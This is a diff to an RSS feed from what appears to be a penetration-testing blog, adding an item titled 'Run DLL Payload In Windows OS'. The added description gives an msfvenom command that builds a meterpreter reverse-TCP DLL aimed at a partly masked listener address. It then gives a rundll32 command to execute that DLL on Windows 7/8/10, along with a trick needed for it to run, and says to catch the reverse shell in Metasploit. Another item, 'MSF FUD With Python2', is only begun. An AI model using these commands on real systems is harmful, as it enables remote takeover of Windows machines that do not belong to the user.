@@ -14,13 +14,50 @@
     <managingEditor>thiklab@gmail.com (Thik)</managingEditor>
     <webMaster>thiklab@gmail.com (Thik)</webMaster>
     <copyright>&lt;a rel=&#39;license&#39; target=&#39;_blank&#39; href=&#39;http://creativecommons.org/licenses/by-sa/4.0/&#39;&gt;&lt;img alt=&#39;Creative Commons License&#39; style=&#39;border-width:0;display:block;margin-left:auto;margin-right:auto;&#39; src=&#39;https://i.creativecommons.org/l/by-sa/4.0/88x31.png&#39; /&gt;&lt;/a&gt;&amp;copy;2019 - {year} All content is licensed under &lt;a rel=&#39;license&#39; target=&#39;_blank&#39; href=&#39;http://creativecommons.org/licenses/by-sa/4.0/&#39;&gt;CC BY-SA&lt;/a&gt;.</copyright>
-    <lastBuildDate>Sun, 15 Nov 2020 10:01:06 +0700</lastBuildDate>
+    <lastBuildDate>Sat, 24 Apr 2021 21:01:06 +0700</lastBuildDate>
     
         <atom:link href="https://thiklab.com/tags/msf/index.xml" rel="self" type="application/rss+xml" />
     
     
     
 
+      
+      <item>
+        <title>Run DLL Payload In Windows OS</title>
+        <link>https://thiklab.com/posts/run-dll/</link>
+        <pubDate>Sat, 24 Apr 2021 21:01:06 +0700</pubDate>
+        <author>thiklab@gmail.com (Thik)</author>
+        <atom:modified>Sat, 24 Apr 2021 21:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/posts/run-dll/</guid>
+        <description>Generate DLL Payload In penetration testing system open terminal and type.
+1  msfvenom -p windows/meterpreter/reverse_tcp lhost=128.x.x.x lport=4455 -b &amp;#39;\x00\xff&amp;#39; -f dll &amp;gt; idm.dll   Run DLL In windows 7/8/10 open CMD and type.
+1  cmd&amp;gt; c:\Windows\System32\rundll32.exe c:\Users\Zyzz\Desktop\idm32.dll,xoxo   The tricks is to put the *,xoxo* or any strings after *.dll* file, if not the file will not work.
+Get Reverse Shell Go back to metasploit and get the shell.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature/article-one.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>dll</category>
+            
+          
+            
+              <category>msf</category>
+            
+          
+        
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
       
       <item>
         <title>MSF FUD With Python2</title>
